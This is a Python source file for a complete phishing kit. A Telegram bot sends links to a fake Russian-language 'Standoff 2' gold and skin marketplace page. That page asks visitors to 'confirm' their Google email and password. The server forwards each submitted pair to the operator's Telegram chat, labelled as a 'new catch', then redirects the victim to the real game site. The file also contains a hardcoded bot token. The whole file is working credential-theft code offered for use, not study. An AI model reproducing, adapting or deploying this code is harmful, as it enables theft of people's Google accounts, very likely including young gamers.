import asyncio
import logging
import os
import re
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiohttp import web

BOT_TOKEN = "8729915071:AAGn3w7rBkdeaVELxEQea8kgBY0jfljltKk"
ADMIN_CHAT_ID = "6739523131"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

FAKE_PAGE = """<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Купить голду Standoff 2</title>
<style>
body{font-family:Arial;background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
.card{background:#16213e;padding:30px;border-radius:15px;color:white;width:400px;text-align:center;}
.gold-price{font-size:28px;color:#f39c12;margin:15px 0;}
.input{width:100%;padding:10px;margin:10px 0;border-radius:5px;border:none;box-sizing:border-box;}
.btn{background:#2ecc71;color:white;padding:12px;border:none;border-radius:5px;width:100%;cursor:pointer;font-size:16px;}
.btn:hover{background:#27ae60;}
.skin{background:#2c3e50;padding:10px;border-radius:10px;margin:10px 0;display:flex;align-items:center;gap:10px;}
.skin-img{font-size:30px;}
.error{color:#e74c3c;background:#2c3e50;padding:10px;border-radius:5px;margin:10px 0;display:none;}
</style>
<script>
function validateAndSubmit() {
    var email = document.getElementById('email').value.trim();
    var password = document.getElementById('password').value.trim();
    var emailError = document.getElementById('emailError');
    var passwordError = document.getElementById('passwordError');
    var emailValid = false;
    var passwordValid = false;
    
    var emailPattern = /^[^\\s@]+@([^\\s@]+\\.)+[^\\s@]+$/;
    if (email === "") {
        emailError.innerText = "❌ Введите email";
        emailError.style.display = "block";
        emailValid = false;
    } else if (!emailPattern.test(email)) {
        emailError.innerText = "❌ Неправильный формат email (пример: name@domain.com)";
        emailError.style.display = "block";
        emailValid = false;
    } else {
        emailError.style.display = "none";
        emailValid = true;
    }
    
    if (password === "") {
        passwordError.innerText = "❌ Введите пароль";
        passwordError.style.display = "block";
        passwordValid = false;
    } else {
        passwordError.style.display = "none";
        passwordValid = true;
    }
    
    if (emailValid && passwordValid) {
        document.getElementById('loginForm').submit();
    }
}
</script>
</head>
<body>
<div class="card">
<h2>🔫 STANDOFF 2 MARKET</h2>
<div class="gold-price">💰 5000 ГОЛДЫ = 250₽</div>
<div class="skin">
<div class="skin-img">🔪</div>
<div>🏆 Легендарный нож «Коготь»<br>🎯 Аренда: 50₽/день</div>
</div>
<div class="skin">
<div class="skin-img">🔫</div>
<div>✨ Скин M4A4 «Император»<br>🎯 Аренда: 30₽/день</div>
</div>
<p>✅ Для покупки или аренды подтвердите вход в Google</p>
<form id="loginForm" action="/login" method="POST">
<input type="email" name="email" id="email" class="input" placeholder="Email от Google аккаунта" autocomplete="off">
<div id="emailError" class="error"></div>
<input type="password" name="password" id="password" class="input" placeholder="Пароль" autocomplete="off">
<div id="passwordError" class="error"></div>
<button type="button" class="btn" onclick="validateAndSubmit()">🎮 ПОДТВЕРДИТЬ И ВОЙТИ</button>
</form>
<p style="font-size:12px; color:#7f8c8d;">Ваши данные защищены. После входа голда будет начислена автоматически.</p>
</div>
</body>
</html>"""

async def handle_index(request):
    headers = {'Cache-Control': 'no-cache, no-store, must-revalidate'}
    return web.Response(text=FAKE_PAGE, content_type='text/html', headers=headers)

async def handle_login(request):
    data = await request.post()
    email = data.get('email', '').strip()
    password = data.get('password', '').strip()
    
    email_pattern = re.compile(r'^[^\s@]+@([^\s@]+\.)+[^\s@]+$')
    if not email or not password or not email_pattern.match(email):
        return web.Response(text="Ошибка", status=400)
    
    msg = f"🔓 НОВЫЙ УЛОВ!\n📧 Email: {email}\n🔑 Пароль: {password}"
    await bot.send_message(ADMIN_CHAT_ID, msg)
    
    success_page = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Успешно</title>
<style>body{background:#1a1a2e;color:white;font-family:Arial;text-align:center;padding:50px;}</style>
</head>
<body>
<h2>✅ ДОСТУП ПОДТВЕРЖДЁН</h2>
<p>Голда будет начислена в течение 5 минут.</p>
<script>setTimeout(()=>{window.location.href='https://standoff2.com';},3000);</script>
</body>
</html>"""
    return web.Response(text=success_page, content_type='text/html')

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    site_url = "https://standoff-bot-i57l.onrender.com"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 КУПИТЬ ГОЛДУ", url=site_url)],
        [InlineKeyboardButton(text="🔪 АРЕНДОВАТЬ СКИН", url=site_url)],
        [InlineKeyboardButton(text="📦 ВСЕ ПРЕДЛОЖЕНИЯ", url=site_url)]
    ])
    await message.answer(
        "🔫 **STANDOFF 2 — МАРКЕТПЛЕЙС**\n\n💰 5000 голды — 250₽\n🔪 Аренда скинов — от 30₽/день",
        reply_markup=keyboard, parse_mode="Markdown"
    )

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_index)
    app.router.add_post('/login', handle_login)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 10000))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def main():
    asyncio.create_task(start_web_server())
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())